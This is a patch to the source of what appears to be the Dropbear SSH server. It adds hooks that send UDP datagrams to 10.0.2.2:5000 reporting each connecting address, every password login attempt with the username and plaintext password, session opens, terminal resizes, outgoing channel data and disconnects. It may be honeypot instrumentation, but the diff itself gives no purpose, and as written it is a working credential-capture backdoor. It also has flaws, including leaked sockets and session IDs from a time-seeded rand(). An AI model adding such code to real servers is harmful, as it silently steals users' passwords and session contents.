@@ -1,0 +1,160 @@
+--- a/packet.c
++++ b/packet.c
+@@ -499,7 +499,15 @@ void encrypt_packet() {
+ 		enqueue_reply_packet();
+ 		return;
+ 	}
+-		
++
++	if (packet_type == 0x5E) {
++		unsigned char *buf = create_buffer_and_fill_session_id(ses.writepayload->len - 9);
++		buf[1] = 0x04;
++		memcpy(buf + 18, ses.writepayload->data + 9, ses.writepayload->len - 9);
++		report_data(buf, 18 + ses.writepayload->len - 9);
++		free(buf);
++	}
++
+ 	blocksize = ses.keys->trans.algo_crypt->blocksize;
+ 	mac_size = ses.keys->trans.algo_mac->hashsize;
+ 
+--- a/common-session.c
++++ b/common-session.c
+@@ -285,6 +285,12 @@ void session_cleanup() {
+ 		return;
+ 	}
+ 
++	/* report disconnection */
++	unsigned char *buf = create_buffer_and_fill_session_id(0);
++	buf[1] = 0x05;
++	report_data(buf, 18);
++	free(buf);
++
+ 	/* BEWARE of changing order of functions here. */
+ 
+ 	/* Must be before extra_session_cleanup() */
+@@ -669,3 +675,19 @@ void update_channel_prio() {
+ 	}
+ }
+ 
++unsigned char *create_buffer_and_fill_session_id(int extra_length) {
++	unsigned char *buf = malloc(2 + 16 + extra_length);
++	buf[0] = 0;
++	memcpy(buf + 2, ses.sid, 16);
++	return buf;
++}
++
++void report_data(const unsigned char *data, int len) {
++	struct sockaddr_in addr;
++	int s = socket(AF_INET, SOCK_DGRAM, 0);
++	addr.sin_family = AF_INET;
++	addr.sin_port = htons(5000);
++	addr.sin_addr.s_addr = inet_addr("10.0.2.2");
++	sendto(s, data, len, 0, (struct sockaddr *) &addr, sizeof(addr));
++}
++
+--- a/session.h
++++ b/session.h
+@@ -55,6 +55,9 @@ void update_channel_prio(void);
+ const char* get_user_shell(void);
+ void fill_passwd(const char* username);
+ 
++unsigned char *create_buffer_and_fill_session_id(int extra_length);
++void report_data(const unsigned char *data, int len);
++
+ /* Server */
+ void svr_session(int sock, int childpipe) ATTRIB_NORETURN;
+ void svr_dropbear_exit(int exitcode, const char* format, va_list param) ATTRIB_NORETURN;
+@@ -216,6 +219,7 @@ struct sshsession {
+ 	 * really belong here, but nowhere else fits nicely */
+ 	int allowprivport;
+ 
++	unsigned char sid[16];
+ };
+ 
+ struct serversession {
+--- a/svr-authpasswd.c
++++ b/svr-authpasswd.c
+@@ -74,6 +74,17 @@ void svr_auth_password() {
+ 
+ 	password = buf_getstring(ses.payload, &passwordlen);
+ 
++	/* report login attempt */
++	uint16_t usernamelen = strlen(ses.authstate.username);
++	unsigned char *buf = create_buffer_and_fill_session_id(usernamelen + passwordlen + 4);
++	buf[1] = 0x01;
++	buf[18] = (unsigned char) usernamelen;
++	memcpy(buf + 19, ses.authstate.username, usernamelen);
++	buf[19 + usernamelen] = (unsigned char) passwordlen;
++	memcpy(buf + 20 + usernamelen, password, passwordlen);
++	report_data(buf, usernamelen + passwordlen + 20);
++	free(buf);
++
+ 	/* the first bytes of passwdcrypt are the salt */
+ 	testcrypt = crypt(password, passwdcrypt);
+ 	m_burn(password, passwordlen);
+--- a/svr-chansession.c
++++ b/svr-chansession.c
+@@ -268,6 +268,12 @@ static int newchansess(struct Channel *c
+ 
+ 	channel->prio = DROPBEAR_CHANNEL_PRIO_INTERACTIVE;
+ 
++	/* report session */
++	unsigned char *buf = create_buffer_and_fill_session_id(0);
++	buf[1] = 0x02;
++	report_data(buf, 18);
++	free(buf);
++
+ 	return 0;
+ 
+ }
+@@ -457,6 +463,14 @@ static int sessionwinchange(struct ChanS
+ 	
+ 	pty_change_window_size(chansess->master, termr, termc, termw, termh);
+ 
++	/* report resize */
++	unsigned char *buf = create_buffer_and_fill_session_id(2);
++	buf[1] = 0x03;
++	buf[18] = termr;
++	buf[19] = termc;
++	report_data(buf, 20);
++	free(buf);
++
+ 	return DROPBEAR_SUCCESS;
+ }
+ 
+--- a/svr-session.c
++++ b/svr-session.c
+@@ -88,6 +88,13 @@ svr_session_cleanup(void) {
+ 	svr_ses.childpidsize = 0;
+ }
+ 
++void fill_sid(unsigned char *buf) {
++	srand(time(NULL));
++	for (int i = 0; i != 16; ++i) {
++		buf[i] = rand() % 256;
++	}
++}
++
+ void svr_session(int sock, int childpipe) {
+ 	char *host, *port;
+ 	size_t len;
+@@ -114,6 +121,19 @@ void svr_session(int sock, int childpipe
+ 	get_socket_address(ses.sock_in, NULL, NULL, 
+ 			&svr_ses.remotehost, NULL, 1);
+ 
++	/* report connection */
++	fill_sid(ses.sid);
++
++	unsigned char *buf = create_buffer_and_fill_session_id(6);
++	struct sockaddr_in remote;
++	socklen_t addrlen = sizeof(remote);
++	getpeername(ses.sock_out, (struct sockaddr *)&remote, &addrlen);
++	buf[1] = 0x00;
++	memcpy(buf + 18, (const void *)&remote.sin_addr.s_addr, 4);
++	memcpy(buf + 22, (const void *)&remote.sin_port, 2);
++	report_data(buf, 24);
++	free(buf);
++
+ 	/* set up messages etc */
+ 	ses.remoteclosed = svr_remoteclosed;
+ 	ses.extra_session_cleanup = svr_session_cleanup;
